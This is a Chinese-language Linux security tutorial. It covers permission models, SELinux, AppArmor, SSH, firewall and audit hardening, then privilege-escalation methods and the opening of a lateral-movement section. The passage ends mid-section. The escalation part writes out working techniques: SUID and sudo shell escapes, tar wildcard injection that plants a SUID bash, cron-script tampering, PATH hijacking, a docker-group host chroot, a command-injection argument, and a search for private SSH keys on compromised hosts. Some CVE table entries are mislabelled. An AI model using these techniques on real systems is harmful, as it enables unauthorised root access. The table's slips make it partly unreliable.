# Linux 终端安全详解

> 本文档深入讲解 Linux 终端安全的各个方面，包括安全机制、配置基线、提权方法、横向移动、权限维持、恶意代码分析、应急响应和安全加固。

---

## 一、Linux 安全机制

### 1.1 用户权限模型

**Linux 用户体系**

Linux 是多用户操作系统，每个用户都有唯一的 UID（用户标识）和 GID（组标识）。

| 用户类型 | UID 范围 | 说明 |
|----------|----------|------|
| root 用户 | 0 | 超级用户，拥有所有权限 |
| 系统用户 | 1-999（不同发行版可能不同） | 运行系统服务的用户 |
| 普通用户 | 1000+ | 登录用户 |

**相关文件**

| 文件 | 作用 |
|------|------|
| /etc/passwd | 用户账户信息 |
| /etc/shadow | 用户密码哈希（需 root 权限读取） |
| /etc/group | 组信息 |
| /etc/gshadow | 组密码信息 |
| /etc/sudoers | sudo 配置 |

**/etc/passwd 格式**

```
用户名:密码占位符:UID:GID:用户信息:主目录:登录shell
示例：
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
user:x:1000:1000:User:/home/user:/bin/bash
```

**/etc/shadow 格式**

```
用户名:密码哈希:最后修改时间:最小使用天数:最大使用天数:警告天数:非活动天数:过期时间:保留字段
示例：
root:$6$abcdefgh$ijklmnopqrstuvwxyz:19000:0:99999:7:::

密码哈希格式：$id$salt$hashed
- $1$: MD5
- $2a$: Blowfish
- $5$: SHA-256
- $6$: SHA-512
- $y$: yescrypt
```

### 1.2 文件权限

**UGO 权限模型**

Linux 文件权限分为三类用户：所有者（User）、组（Group）、其他（Other），每类用户有三种权限：读（Read）、写（Write）、执行（Execute）。

```
权限表示：
r = 读 (4)
w = 写 (2)
x = 执行 (1)

示例：
-rw-r--r--  1 user group  1234 Sep 11 10:00 file.txt
drwxr-xr-x  2 user group  4096 Sep 11 10:00 dir/

第一个字符：文件类型
- = 普通文件
d = 目录
l = 符号链接
b = 块设备
c = 字符设备
s = 套接字
p = 管道

后面9个字符分为三组：
所有者权限: rw- (6)
组权限:     r-- (4)
其他权限:   r-- (4)
```

**特殊权限**

| 权限 | 文件上的作用 | 目录上的作用 | 八进制值 |
|------|-------------|-------------|----------|
| SUID | 以文件所有者身份执行 | 无意义 | 4000 |
| SGID | 以文件所属组身份执行 | 新文件继承目录的组 | 2000 |
| Sticky Bit | 无意义 | 只有文件所有者才能删除文件 | 1000 |

```
SUID 示例：
-rwsr-xr-x 1 root root 43696 Jan  1 00:00 /usr/bin/passwd
（所有者执行位的 x 变成了 s，表示设置了 SUID）

SGID 示例：
drwxrwsr-x 2 root group 4096 Jan  1 00:00 /dir
（组执行位的 x 变成了 s，表示设置了 SGID）

Sticky Bit 示例：
drwxrwxrwt 10 root root 4096 Jan  1 00:00 /tmp
（其他执行位的 x 变成了 t，表示设置了 Sticky Bit）
```

**查找 SUID/SGID 文件**

```bash
# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 查找所有可写的 SUID 文件（高危）
find / -perm -4000 -writable -type f 2>/dev/null
```

### 1.3 ACL（访问控制列表）

**ACL 概述**

ACL（Access Control List）是对标准 UGO 权限的扩展，允许为特定用户或组设置更细粒度的权限。

**常用命令**

```bash
# 查看 ACL
getfacl /path/to/file

# 设置 ACL（给特定用户读写权限）
setfacl -m u:username:rw /path/to/file

# 设置 ACL（给特定组读权限）
setfacl -m g:groupname:r /path/to/file

# 删除特定用户的 ACL
setfacl -x u:username /path/to/file

# 删除所有 ACL
setfacl -b /path/to/file

# 设置默认 ACL（对目录，新文件继承）
setfacl -m d:u:username:rw /path/to/dir
```

### 1.4 SELinux

**SELinux 概述**

SELinux（Security-Enhanced Linux）是由美国国家安全局（NSA）开发的强制访问控制（MAC）安全模块，已集成到 Linux 内核中。它为 Linux 提供了细粒度的强制访问控制能力。

**SELinux 三种模式**

| 模式 | 说明 |
|------|------|
| Enforcing | 强制模式，SELinux 策略被强制执行，违反策略的操作会被拒绝并记录 |
| Permissive | 宽容模式，策略不会强制执行，只会记录违反操作（用于调试） |
| Disabled | 禁用，SELinux 完全关闭 |

**查看和切换 SELinux 模式**

```bash
# 查看当前 SELinux 状态
getenforce
sestatus

# 临时切换模式（重启后失效）
setenforce 0  # 切换到 Permissive
setenforce 1  # 切换到 Enforcing

# 永久切换（修改配置文件，需要重启）
vim /etc/selinux/config
SELINUX=enforcing  # 或 permissive / disabled
```

**SELinux 安全上下文**

每个文件、进程、端口都有安全上下文（Security Context），格式为：

```
user:role:type:level
示例：
system_u:object_r:httpd_sys_content_t:s0 /var/www/html/index.html
system_u:system_r:httpd_t:s0 /usr/sbin/httpd
```

- **user**：SELinux 用户（system_u、unconfined_u 等）
- **role**：SELinux 角色（object_r、system_r 等）
- **type**：SELinux 类型（最重要，用于类型强制）
- **level**：多级安全级别（MLS/MCS）

**常用 SELinux 管理命令**

```bash
# 查看文件安全上下文
ls -Z /path/to/file

# 查看进程安全上下文
ps -eZ

# 查看端口安全上下文
semanage port -l

# 修改文件安全上下文
chcon -t httpd_sys_content_t /path/to/file

# 恢复默认安全上下文
restorecon -Rv /path/to/dir

# 添加端口规则
semanage port -a -t http_port_t -p tcp 8080

# 查看布尔值
getsebool -a
getsebool httpd_enable_homedirs

# 设置布尔值
setsebool httpd_enable_homedirs on
setsebool -P httpd_enable_homedirs on  # 永久设置

# 查看 SELinux 日志
ausearch -m avc -ts recent
sealert -a /var/log/audit/audit.log
```

**SELinux 日志分析**

```bash
# 查看 SELinux 拒绝日志
ausearch -m AVC -ts today

# 使用 sealert 分析日志（更友好的输出）
sealert -a /var/log/audit/audit.log

# 实时监控 SELinux 事件
tail -f /var/log/audit/audit.log | grep avc
```

### 1.5 AppArmor

**AppArmor 概述**

AppArmor 是另一种强制访问控制（MAC）系统，与 SELinux 相比，AppArmor 使用路径名来标识文件，配置相对简单。主要用于 Ubuntu、SUSE 等发行版。

**AppArmor 状态管理**

```bash
# 查看 AppArmor 状态
aa-status
apparmor_status

# 启用/禁用 AppArmor 配置
aa-enforce /etc/apparmor.d/usr.bin.nginx
aa-complain /etc/apparmor.d/usr.bin.nginx  # 投诉模式（只记录不阻止）
aa-disable /etc/apparmor.d/usr.bin.nginx

# 重新加载配置
apparmor_parser -r /etc/apparmor.d/usr.bin.nginx
```

**AppArmor 配置文件示例**

```
# /etc/apparmor.d/usr.bin.nginx
#include <tunables/global>

/usr/sbin/nginx {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  capability setuid,
  capability setgid,
  capability net_bind_service,
  
  /usr/sbin/nginx mr,
  /var/log/nginx/*.log w,
  /etc/nginx/** r,
  /var/www/** r,
  
  /run/nginx.pid rw,
}
```

### 1.6 chroot 与容器隔离

**chroot**

chroot 是将进程的根目录切换到指定目录的操作，使进程无法访问该目录之外的文件系统。

```bash
# 创建 chroot 环境
mkdir -p /chroot_env/{bin,lib,lib64,etc}

# 复制需要的程序和库
cp /bin/bash /chroot_env/bin/
cp /bin/ls /chroot_env/bin/
ldd /bin/bash  # 查看依赖的库
# 复制所有依赖的库文件到相应目录

# 进入 chroot 环境
chroot /chroot_env /bin/bash
```

**chroot 的局限性**

- 不是安全边界，可以被有足够权限的进程逃逸
- 只隔离文件系统，不隔离网络、进程等
- 需要 root 权限才能使用

**Linux Namespace（命名空间）**

命名空间是 Linux 内核提供的隔离机制，是容器技术的基础：

| 命名空间 | 隔离内容 |
|----------|----------|
| Mount (mnt) | 文件系统挂载点 |
| Process ID (pid) | 进程 ID |
| Network (net) | 网络栈 |
| Interprocess Communication (ipc) | 进程间通信 |
| UTS | 主机名和域名 |
| User ID (user) | 用户和组 ID |
| Control group (cgroup) | 控制组根目录 |

### 1.7 Linux Capabilities

**Capabilities 概述**

Linux Capabilities 将 root 用户的特权划分为不同的能力，允许进程只获得其需要的特权，而不需要完整的 root 权限。

**常用 Capabilities**

| Capability | 说明 |
|------------|------|
| CAP_NET_BIND_SERVICE | 绑定小于 1024 的端口 |
| CAP_NET_ADMIN | 网络管理（配置接口、路由表、防火墙等） |
| CAP_NET_RAW | 使用原始套接字（ping、抓包等） |
| CAP_SYS_ADMIN | 系统管理（多种特权，功能强大） |
| CAP_SYS_PTRACE | ptrace 调试其他进程 |
| CAP_DAC_OVERRIDE | 绕过文件 DAC 权限检查 |
| CAP_DAC_READ_SEARCH | 绕过文件读和目录搜索权限 |
| CAP_SETUID | 操作进程 UID |
| CAP_SETGID | 操作进程 GID |
| CAP_CHOWN | 修改文件所有者 |
| CAP_FOWNER | 绕过文件所有者权限检查 |
| CAP_KILL | 向任意进程发送信号 |
| CAP_MKNOD | 创建特殊文件 |
| CAP_SYS_MODULE | 加载/卸载内核模块 |
| CAP_SYS_RAWIO | 直接 I/O 端口访问 |

**Capabilities 操作**

```bash
# 查看文件的 capabilities
getcap /usr/bin/ping
# 输出：/usr/bin/ping = cap_net_admin,cap_net_raw+p

# 设置文件 capabilities
setcap cap_net_bind_service=ep /usr/bin/nginx

# 清除文件 capabilities
setcap -r /usr/bin/nginx

# 查看进程的 capabilities
cat /proc/<pid>/status | grep Cap
# 或使用 capsh
capsh --print
```

### 1.8 seccomp

**seccomp 概述**

seccomp（secure computing mode）是 Linux 内核的安全特性，允许进程限制自己可以调用的系统调用。这是一种沙箱机制，可以减少内核攻击面。

**seccomp 模式**

- **SECCOMP_MODE_STRICT**：严格模式，只允许 read、write、_exit、sigreturn 四个系统调用
- **SECCOMP_MODE_FILTER**：过滤器模式，使用 BPF 过滤器定义允许的系统调用

**seccomp 应用场景**

- 容器运行时（Docker、containerd）
- 浏览器沙箱（Chrome、Firefox）
- 服务程序沙箱（systemd、vsftpd）
- 漏洞利用缓解

```bash
# 查看 Docker 默认 seccomp 配置
docker run --rm alpine cat /proc/self/status | grep Seccomp

# 运行时禁用 seccomp（不推荐）
docker run --rm --security-opt seccomp=unconfined alpine sh
```

---

## 二、Linux 安全配置基线

### 2.1 账户安全

**密码策略**

编辑 /etc/login.defs：

```bash
# 密码最长使用期限（天）
PASS_MAX_DAYS   90

# 密码最短使用期限（天）
PASS_MIN_DAYS   1

# 密码最短长度
PASS_MIN_LEN    14

# 密码过期前警告天数
PASS_WARN_AGE   7
```

**PAM 密码复杂度**

```bash
# CentOS/RHEL - 安装 pam_pwquality
yum install libpwquality
# 编辑 /etc/security/pwquality.conf
minlen = 14           # 最小长度
dcredit = -1          # 至少一个数字
ucredit = -1          # 至少一个大写字母
lcredit = -1          # 至少一个小写字母
ocredit = -1          # 至少一个特殊字符
maxrepeat = 3         # 最多连续相同字符数
maxclassrepeat = 4    # 最多同类字符连续数

# Ubuntu/Debian
# 编辑 /etc/pam.d/common-password
password requisite pam_pwquality.so retry=3 minlen=14 dcredit=-1 ucredit=-1 lcredit=-1 ocredit=-1
```

**账户锁定策略**

```bash
# CentOS/RHEL - 编辑 /etc/pam.d/system-auth 和 /etc/pam.d/password-auth
auth required pam_faillock.so preauth silent deny=5 unlock_time=1800
auth [default=die] pam_faillock.so authfail deny=5 unlock_time=1800
account required pam_faillock.so

# Ubuntu/Debian - 编辑 /etc/pam.d/common-auth
auth required pam_tally2.so deny=5 unlock_time=1800 onerr=fail

# 查看账户锁定状态
faillock --user username
pam_tally2 --user username

# 解锁账户
faillock --user username --reset
pam_tally2 --user username --reset
```

**禁用不必要的账户**

```bash
# 查看所有用户账户
cat /etc/passwd | grep -v nologin | grep -v false

# 禁用用户（不删除）
usermod -s /sbin/nologin username
passwd -l username  # 锁定密码

# 启用用户
passwd -u username
usermod -s /bin/bash username

# 删除用户
userdel -r username  # -r 同时删除主目录
```

**检查空密码账户**

```bash
# 查找空密码用户
awk -F: '($2 == "" ) { print $1 }' /etc/shadow

# 锁定空密码账户
passwd -l username
```

### 2.2 SSH 安全配置

**SSH 配置文件**

```bash
# 配置文件路径
/etc/ssh/sshd_config
```

**推荐安全配置**

```bash
# /etc/ssh/sshd_config 安全配置示例

# 禁止 root 直接登录
PermitRootLogin no

# 禁止空密码
PermitEmptyPasswords no

# 使用密钥认证（推荐）
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys

# 禁用密码认证（启用密钥后建议关闭）
PasswordAuthentication no

# 禁用 Challenge-Response 认证
ChallengeResponseAuthentication no

# 禁用 Kerberos 认证（如不需要）
KerberosAuthentication no
GSSAPIAuthentication no

# 禁用 X11 转发（如不需要）
X11Forwarding no

# 禁用 TCP 转发（如不需要）
AllowTcpForwarding no

# 客户端存活配置（防止空闲连接）
ClientAliveInterval 300
ClientAliveCountMax 2

# 最大认证尝试次数
MaxAuthTries 3

# 最大会话数
MaxSessions 5

# 限制登录用户（白名单方式，推荐）
AllowUsers alice bob
AllowGroups sshusers

# 修改默认端口（减少扫描噪音，非核心安全措施）
Port 2222

# 使用协议版本 2（默认已是）
Protocol 2

# 允许的认证方式
AuthenticationMethods publickey

# 登录横幅（可选）
Banner /etc/ssh/banner
```

**SSH 密钥管理**

```bash
# 生成 SSH 密钥对（推荐 ED25519 算法）
ssh-keygen -t ed25519 -C "user@example.com"

# 或者使用 RSA（至少 4096 位）
ssh-keygen -t rsa -b 4096 -C "user@example.com"

# 复制公钥到服务器
ssh-copy-id user@server
# 或手动添加
cat ~/.ssh/id_ed25519.pub | ssh user@server 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'

# 正确的权限设置
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/id_ed25519
chmod 644 ~/.ssh/id_ed25519.pub

# 验证配置并重启 SSH
sshd -t  # 测试配置文件语法
systemctl restart sshd  # 或 ssh
```

### 2.3 防火墙配置

**iptables 基础**

```bash
# 查看当前规则
iptables -L -n -v
iptables -L -n --line-numbers

# 查看 NAT 表
iptables -t nat -L -n -v

# 清空所有规则
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# 设置默认策略
iptables -P INPUT DROP       # 默认入站拒绝
iptables -P FORWARD DROP     # 默认转发拒绝
iptables -P OUTPUT ACCEPT    # 默认出站允许
```

**iptables 常用规则**

```bash
# 允许回环接口
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 允许已建立和相关的连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 允许 SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# 限制 SSH 源地址
iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT

# 允许 HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 允许 ICMP（Ping）
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT

# 防止 SYN Flood
iptables -N synflood
iptables -A synflood -m limit --limit 1/s --limit-burst 3 -j RETURN
iptables -A synflood -j DROP
iptables -A INPUT -p tcp --syn -j synflood

# 防止端口扫描
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
```

**iptables 保存和恢复**

```bash
# CentOS/RHEL
iptables-save > /etc/sysconfig/iptables
iptables-restore < /etc/sysconfig/iptables

# Debian/Ubuntu
iptables-save > /etc/iptables/rules.v4
iptables-restore < /etc/iptables/rules.v4

# 安装 iptables-persistent（Debian/Ubuntu）
apt install iptables-persistent
```

**firewalld 配置（CentOS/RHEL 7+）**

```bash
# 查看状态
firewall-cmd --state
firewall-cmd --list-all

# 查看默认区域
firewall-cmd --get-default-zone

# 启用/禁用服务
firewall-cmd --add-service=http --permanent
firewall-cmd --add-service=https --permanent
firewall-cmd --add-port=2222/tcp --permanent

# 限制源地址
firewall-cmd --permanent --zone=public --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" service name="ssh" accept'

# 重载规则
firewall-cmd --reload

# 移除规则
firewall-cmd --remove-service=telnet --permanent
```

**ufw 配置（Ubuntu/Debian）**

```bash
# 启用/禁用 ufw
ufw enable
ufw disable

# 默认策略
ufw default deny incoming
ufw default allow outgoing

# 允许服务
ufw allow ssh
ufw allow http
ufw allow https
ufw allow 2222/tcp

# 限制源地址
ufw allow from 192.168.1.0/24 to any port 22

# 查看状态
ufw status verbose
ufw status numbered

# 删除规则
ufw delete allow http
ufw delete 3  # 按编号删除

# 启用日志
ufw logging on
```

### 2.4 审计配置

**auditd 安装与配置**

```bash
# CentOS/RHEL
yum install audit
systemctl enable auditd
systemctl start auditd

# Ubuntu/Debian
apt install auditd
systemctl enable auditd
systemctl start auditd
```

**auditd 配置文件**

```bash
# 主配置文件
/etc/audit/auditd.conf

# 规则文件
/etc/audit/rules.d/audit.rules
```

**常用审计规则**

```bash
# /etc/audit/rules.d/audit.rules

# 监控系统时间修改
-a always,exit -F arch=b64 -S adjtimex -S settimeofday -k time_change
-a always,exit -F arch=b32 -S adjtimex -S settimeofday -S stime -k time_change

# 监控用户/组修改
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/gshadow -p wa -k identity
-w /etc/sudoers -p wa -k sudo_changes

# 监控登录和认证
-w /var/log/faillog -p wa -k logins
-w /var/log/lastlog -p wa -k logins
-w /var/log/tallylog -p wa -k logins

# 监控网络配置修改
-a always,exit -F arch=b64 -S sethostname -S setdomainname -k system_language
-w /etc/issue -p wa -k system_language
-w /etc/issue.net -p wa -k system_language
-w /etc/hosts -p wa -k system_language
-w /etc/sysconfig/network -p wa -k system_language

# 监控防火墙修改
-w /etc/sysconfig/iptables -p wa -k firewall_changes
-w /etc/firewalld/ -p wa -k firewall_changes

# 监控关键系统文件
-w /etc/pam.d/ -p wa -k pam_changes
-w /etc/ssh/sshd_config -p wa -k ssh_changes
-w /etc/cron.d/ -p wa -k cron_changes
-w /etc/crontab -p wa -k cron_changes

# 监控可执行文件修改
-w /bin/ -p wa -k bin_changes
-w /sbin/ -p wa -k sbin_changes
-w /usr/bin/ -p wa -k usr_bin_changes
-w /usr/sbin/ -p wa -k usr_sbin_changes

# 监控 root 用户操作
-a always,exit -F arch=b64 -S execve -F uid=0 -F auid>=1000 -F auid!=4294967295 -k root_exec

# 监控文件系统挂载
-a always,exit -F arch=b64 -S mount -S umount2 -k mount_changes

# 监控内核模块加载/卸载
-w /sbin/insmod -p x -k module_load
-w /sbin/modprobe -p x -k module_load
-w /sbin/rmmod -p x -k module_load
-a always,exit -F arch=b64 -S init_module -S delete_module -k module_changes

# 监控敏感文件访问
-w /root/.ssh/ -p rw -k root_ssh_access
-w /home/*/.ssh/ -p rw -k user_ssh_access

# 结束标记（必须是最后一条）
-D
-b 8192
-f 1
```

**审计日志查看**

```bash
# 查看所有审计日志
ausearch -m all

# 按关键字搜索
ausearch -k identity  # 搜索身份相关事件
ausearch -k time_change  # 搜索时间修改事件

# 按时间搜索
ausearch -ts today -k ssh_changes
ausearch -ts "09/11/2024 00:00:00" -te "09/11/2024 23:59:59"

# 生成审计报告
aureport -au  # 认证报告
aureport -l   # 登录报告
aureport -p   # 进程报告
aureport -f   # 文件报告
aureport -e   # 事件报告
aureport --summary  # 摘要报告

# 实时监控审计日志
auditctl -s  # 查看审计状态
tail -f /var/log/audit/audit.log
```

---

## 三、Linux 提权方法

### 3.1 内核漏洞提权

**原理**

内核漏洞是指 Linux 内核中的安全漏洞，利用这些漏洞可以从普通用户提升到 root 权限。内核漏洞通常是最严重的本地提权漏洞。

**著名内核提权漏洞**

| 漏洞编号 | CVE | 影响内核版本 | 类型 | 描述 |
|----------|-----|-------------|------|------|
| Dirty COW | CVE-2016-5195 | 2.6.22 - 4.8.3 | 竞态条件 | 写时复制（COW）机制中的竞态条件 |
| Dirty Pipe | CVE-2022-0847 | 5.8 - 5.16.11 | 管道漏洞 | 管道缓冲区覆盖任意文件内容 |
| PwnKit | CVE-2021-4034 | 所有版本（Polkit） | pkexec | pkexec 中的环境变量注入 |
| Dirty Cred | CVE-2022-2588 | 5.1 - 5.19 | UAF | 内核凭证结构体释放后使用 |
| SUID Auxv | CVE-2023-22809 | 5.15+ | sudo | sudoedit 越权写入 |
| Netfilter | CVE-2023-32233 | 5.1 - 6.3.1 | UAF | Netfilter nf_tables UAF |

**Dirty COW 原理**

```
Dirty COW（Dirty Copy-On-Write）是一个内核竞态条件漏洞：

1. Linux 使用写时复制（COW）机制管理私有内存映射
2. 当进程尝试写入私有映射的只读页面时，内核会复制页面并标记为可写
3. 漏洞存在于这个复制过程中的竞态条件
4. 攻击者可以利用竞态条件，在复制完成前修改原始只读页面
5. 从而修改映射的只读文件（如 /etc/passwd），实现提权

利用效果：普通用户可以修改任何只读文件，包括 setuid 程序和系统文件
```

**Dirty Pipe 原理**

```
Dirty Pipe 漏洞允许向任意只读文件写入数据：

1. Linux 管道使用环形缓冲区，每个缓冲区由一个 page 组成
2. 漏洞存在于管道缓冲区的合并操作中
3. 攻击者可以创建管道，写入数据后部分读取
4. 然后使用 splice() 将目标文件的页面拼接到管道缓冲区
5. 再次写入管道时，数据会写入到目标文件的页面缓存中
6. 最终修改只读文件的内容

利用效果：普通用户可以向任意只读文件写入数据（如修改 /etc/passwd 添加 root 用户）
```

**提权检测工具**

```bash
# Linux Exploit Suggester
# https://github.com/mzet-/linux-exploit-suggester
./linux-exploit-suggester.sh

# LinPEAS（全面的提权枚举脚本）
# https://github.com/carlospolop/PEASS-ng
./linpeas.sh

# Linux Smart Enumeration
# https://github.com/diego-treitos/linux-smart-enumeration
./lse.sh

# 查看内核版本
uname -a
cat /proc/version
```

### 3.2 SUID/SGID 提权

**原理**

SUID（Set User ID）是一种特殊权限，允许程序以文件所有者的权限运行。如果 SUID 程序的所有者是 root，且程序存在漏洞或可被利用，普通用户就可以通过它获得 root 权限。

**查找 SUID 文件**

```bash
# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 查找同时有 SUID 和 SGID 的文件
find / -perm -6000 -type f 2>/dev/null

# 查找可写的 SUID 文件（高危）
find / -perm -4000 -writable -type f 2>/dev/null

# 查找特定用户拥有的 SUID 文件
find / -perm -4000 -user root -type f 2>/dev/null
```

**常见 SUID 提权场景**

**场景1：可执行系统命令（如 find、nmap、vim）**

```bash
# find 提权
find /path/to/file -exec /bin/sh \;

# nmap 提权（旧版本）
nmap --interactive
nmap> !sh

# vim 提权
vim -c ':!/bin/sh'

# less/more 提权
less /etc/passwd
!sh

# man 提权
man man
!sh

# awk 提权
awk 'BEGIN {system("/bin/sh")}'
```

**场景2：自定义 SUID 程序存在命令注入**

```bash
# 假设 /usr/local/bin/backup 是 SUID 程序，功能是备份指定目录
# 如果它直接使用 system() 或 exec 执行命令且参数可控

# 查看程序字符串
strings /usr/local/bin/backup

# 分析程序调用
strace /usr/local/bin/backup /tmp/test 2>&1 | grep exec

# 如果程序内部调用了 tar、rsync 等命令，且路径参数可注入
backup "/tmp; id"  # 可能执行 id 命令（命令注入）
```

**场景3：SUID 程序路径可写（替换文件）**

```bash
# 如果 SUID 程序本身或其所在目录可写
# 直接替换为恶意程序即可获得 root 权限

cp /bin/bash /tmp/bash
chmod u+s /tmp/bash  # 需要写权限才能设置 SUID
# 如果原 SUID 程序可写，直接覆盖即可
```

**场景4：共享库劫持**

```bash
# 如果 SUID 程序使用了相对路径的共享库，
# 或者可以通过环境变量注入恶意共享库

# 查看程序依赖的库
ldd /usr/local/bin/suid_program

# 检查 RPATH/RUNPATH
readelf -d /usr/local/bin/suid_program | grep -i rpath

# 如果 RPATH 指向可写目录，可放入恶意库
# 或使用 LD_PRELOAD（SUID 程序默认忽略 LD_PRELOAD）
```

### 3.3 sudo 提权

**原理**

sudo 允许普通用户以其他用户（通常是 root）的身份执行命令。如果 sudo 配置不当，可能被利用来提升权限。

**sudo 配置文件**

```bash
# sudo 配置文件
/etc/sudoers
/etc/sudoers.d/

# 查看当前用户的 sudo 权限
sudo -l
```

**常见 sudo 提权场景**

**场景1：允许运行特定命令，命令可被利用**

```bash
# 示例 sudoers 配置：
# user ALL=(ALL) NOPASSWD: /usr/bin/find

# find 可以执行命令
sudo find / -name test -exec /bin/bash \;

# 其他常见可利用命令：
# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# vim
sudo vim -c ':!/bin/bash'

# less/more
sudo less /etc/passwd
# 然后输入 !bash

# python
sudo python -c 'import os; os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# tar
sudo tar cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**场景2：通配符误用**

```bash
# 示例 sudoers 配置（危险！）：
# user ALL=(ALL) NOPASSWD: /usr/bin/zip backup.zip *

# 利用通配符注入
cd /tmp
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/bash; chmod u+s /tmp/bash" > shell.sh
chmod +x shell.sh
sudo zip backup.zip *  # 执行后获得 SUID bash
/tmp/bash -p
```

**场景3：sudo 版本漏洞（CVE-2021-3156 - Baron Samedit）**

```
Baron Samedit 是 sudo 的堆溢出漏洞：

1. sudoedit 命令在处理命令行参数时存在堆溢出
2. 漏洞存在于 sudoers.c 的 set_cmnd() 函数中
3. 当命令行中包含反斜杠转义的字符时，可能触发溢出
4. 无需知道用户密码，无需 sudo 权限

影响版本：
- sudo 1.8.2 - 1.8.31p2
- sudo 1.9.0 - 1.9.5p1

检测：
sudo --version

利用工具：
https://github.com/blasty/CVE-2021-3156
```

### 3.4 计划任务提权

**原理**

计划任务（Cron Job）是 Linux 系统中定时执行任务的机制。如果计划任务配置不当，可能被利用来提升权限。

**Cron 配置文件**

```
系统级计划任务：
- /etc/crontab
- /etc/cron.d/
- /etc/cron.hourly/
- /etc/cron.daily/
- /etc/cron.weekly/
- /etc/cron.monthly/

用户级计划任务：
- /var/spool/cron/crontabs/<username> (Debian/Ubuntu)
- /var/spool/cron/<username> (CentOS/RHEL)
```

**常见计划任务提权场景**

**场景1：任务脚本可写**

```bash
# 查找 root 计划任务执行的脚本
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/

# 如果脚本可被普通用户写入
-rwxrwxrwx 1 root root 100 Sep 11 10:00 /etc/cron.daily/backup.sh

# 直接修改脚本添加提权命令
echo "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash" >> /etc/cron.daily/backup.sh
# 等待任务执行，然后运行 /tmp/bash -p
```

**场景2：通配符 + 可写目录**

```bash
# 假设 cron 任务执行：
# */5 * * * * root cd /backup && tar -zcf /tmp/backup.tar.gz *

# 如果 /backup 目录可写
cd /backup
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh /tmp/shell.sh"
echo "chmod u+s /bin/bash" > /tmp/shell.sh
chmod +x /tmp/shell.sh
# 等待 cron 执行 tar 命令，触发 checkpoint action
```

**场景3：PATH 环境变量劫持**

```bash
# 假设 crontab 中设置了不安全的 PATH：
# PATH=/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# 或者脚本中使用了相对路径的命令
# 脚本内容：
#!/bin/bash
cd /data
backup  # 使用了相对路径的命令

# 如果 PATH 中包含可写目录
# 在可写目录中创建同名恶意程序
cat > /tmp/backup << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/backup
# 等待 cron 执行
```

### 3.5 其他提权方法

**环境变量劫持**

```bash
# 如果 SUID 或 sudo 程序调用了相对路径的命令
# 可以通过修改 PATH 环境变量劫持

# 示例：suid_program 内部调用了 "date" 命令
export PATH=/tmp:$PATH
cat > /tmp/date << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/date
./suid_program
/tmp/bash -p
```

**可写的服务配置文件**

```bash
# 查找可写的 systemd 服务文件
find /etc/systemd/system/ -writable -type f 2>/dev/null
find /lib/systemd/system/ -writable -type f 2>/dev/null

# 如果服务配置可写，修改 ExecStart 指向恶意程序
# 然后等待服务重启或系统重启

# 查找可写的 init.d 脚本
find /etc/init.d/ -writable -type f 2>/dev/null
```

**Docker 组提权**

```bash
# 如果用户在 docker 组中，可以利用 docker 获得 root 权限
docker run -v /:/host -it alpine chroot /host /bin/bash

# 检查用户是否在 docker 组
id
groups

# 利用：挂载宿主机根目录到容器，然后 chroot
```

**NFS 共享提权**

```bash
# 如果 NFS 共享配置了 no_root_squash
# 客户端的 root 用户在 NFS 共享上拥有 root 权限

# 查看 NFS 共享配置
cat /etc/exports

# 示例（危险配置）：
# /data *(rw,no_root_squash)

# 攻击者可以在客户端创建 SUID 文件
# 然后在目标系统上执行
```

---

## 四、Linux 横向移动

### 4.1 SSH 横向移动

**SSH 信息收集**

```bash
# 扫描网段中的 SSH 服务
nmap -p 22 192.168.1.0/24
masscan 192.168.1.0/24 -p22 --rate=1000

# 测试 SSH 连接
ssh user@target_ip
ssh -i id_rsa user@target_ip

# 查看 SSH 版本
nc -v target_ip 22
ssh -v target_ip 2>&1 | grep -i "remote proto"
```

**SSH 凭据传递**

```bash
# 密码登录
ssh user@target_ip

# 密钥登录
ssh -i private_key user@target_ip

# 使用 sshpass 自动输入密码
sshpass -p 'password' ssh user@target_ip

# 代理转发（使用当前机器的 SSH Agent 访问跳板机后的机器）
ssh -A user@jump_host
# 在跳板机上可以直接 ssh 到内网其他机器
ssh user@internal_host
```

**SSH 密钥复用**

```bash
# 在攻陷的主机上查找 SSH 私钥
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# 查找 authorized_keys
